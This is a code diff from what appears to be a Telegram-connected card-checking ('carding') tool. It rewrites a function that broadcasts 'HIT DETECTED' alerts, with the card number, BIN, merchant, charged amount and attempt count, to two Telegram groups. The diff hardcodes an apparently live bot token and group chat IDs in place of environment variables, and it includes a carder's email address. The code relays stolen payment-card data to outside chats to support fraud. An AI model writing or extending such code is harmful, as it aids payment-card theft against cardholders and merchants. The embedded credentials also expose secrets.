@@ -496,56 +496,35 @@ const MAIN_MENU_KEYBOARD = {
 
 // Send hit notification to group chats
 async function sendHitToGroups(hitData, checkoutUrl) {
-  // IMMEDIATE FILE LOGGING - Create file as soon as function is called
-  const fs = require('fs');
-  const path = require('path');
-  const logData = {
-    timestamp: new Date().toISOString(),
-    function: 'sendHitToGroups',
-    hitData: hitData,
-    checkoutUrl: checkoutUrl,
-    status: 'function_called'
-  };
-  const logFile = path.join(__dirname, '..', 'sendhit_groups_called.json');
-  fs.writeFileSync(logFile, JSON.stringify(logData, null, 2));
-
-  console.log('[SEND_HIT_GROUPS] Called with hitData:', hitData);
-
-  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const GROUP_1 = process.env.TELEGRAM_GROUP_1; // ARIESxHIT Chat - Simple format
-  const GROUP_2 = process.env.TELEGRAM_GROUP_2; // Aries Hits - Detailed format
-
-  console.log('[SEND_HIT_GROUPS] Config - BOT_TOKEN:', !!BOT_TOKEN, 'GROUP_1:', GROUP_1, 'GROUP_2:', GROUP_2);
-
-  if (!BOT_TOKEN) {
-    console.log('[SEND_HIT_GROUPS] No BOT_TOKEN, returning');
-    return;
-  }
-
-  if (!GROUP_1 && !GROUP_2) {
-    console.log('[SEND_HIT_GROUPS] No groups configured, returning');
-    return;
-  }
-
-  // Send debug message to user's personal chat to confirm function is working
-  const debugMessage = `🔧 DEBUG: sendHitToGroups executed!\nHit: ${hitData.card}\nMerchant: ${hitData.merchant}\nTime: ${new Date().toLocaleTimeString()}`;
+  // DIRECT FIX: Use hardcoded values that we know work
+  const BOT_TOKEN = '8268278005:AAG49bxahCC_JjC_vG-pE8lv5RqTU0Duh5M';
+  const GROUP_1 = '-1003835715499'; // ARIESxHIT Chat
+  const GROUP_2 = '-1003750219718'; // Aries Hits
 
   try {
-    // Send to user's personal chat instead of groups for testing
-    await sendMessage(BOT_TOKEN, hitData.userId, debugMessage);
-    console.log('[SEND_HIT_GROUPS] Debug message sent to user:', hitData.userId);
-  } catch (debugError) {
-    console.error('[SEND_HIT_GROUPS] Failed to send debug message:', debugError.message);
-  }
-
-  // Also try to send to group if configured
-  try {
+    // Send to GROUP_1 (ARIESxHIT Chat) - Simple format
     if (GROUP_1) {
-      await sendMessage(BOT_TOKEN, GROUP_1, `🎯 HIT: ${hitData.card} | ${hitData.merchant}`);
-      console.log('[SEND_HIT_GROUPS] Group message sent to GROUP_1');
+      const group1Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\nName :- ${hitData.userName}\nAmount :- $${hitData.amount}\nAttempt :- ${hitData.attempts}\nTime :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
+
+      await sendMessage(BOT_TOKEN, GROUP_1, group1Message);
+      console.log('✅ Group notification sent to ARIESxHIT Chat');
     }
-  } catch (groupError) {
-    console.error('[SEND_HIT_GROUPS] Failed to send group message:', groupError.message);
+
+    // Send to GROUP_2 (Aries Hits) - Detailed format
+    if (GROUP_2) {
+      const bin = hitData.bin || 'Unknown';
+      const binSource = hitData.binMode || '';
+      const group2Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗\n─────────────────\n\n「❃」 Name :- ${hitData.userName}\n「❃」 Card :- ${hitData.card}\n「❃」 Bin :- ${bin}${binSource}\n「❃」 Merchant :- ${hitData.merchant}\n「❃」 Email :- cardernarutov3@gmail.com\n「❃」 Amount :- $${hitData.amount}\n「❃」 Response : Charged\n「❃」 Attempt :- ${hitData.attempts}\n「❃」 Time :- ${hitData.timeTaken}\n\n─────────────────\nThanks For Using Ariesxhit. 💗`;
+
+      await sendMessage(BOT_TOKEN, GROUP_2, group2Message);
+      console.log('✅ Group notification sent to Aries Hits');
+    }
+
+    console.log('🎉 All group notifications sent successfully!');
+
+  } catch (error) {
+    console.error('❌ Failed to send group notifications:', error.message);
+    // Don't throw - we don't want this to break the main flow
   }
 
   // Detect merchant name - prioritize hitData.merchant, fallback to URL detection
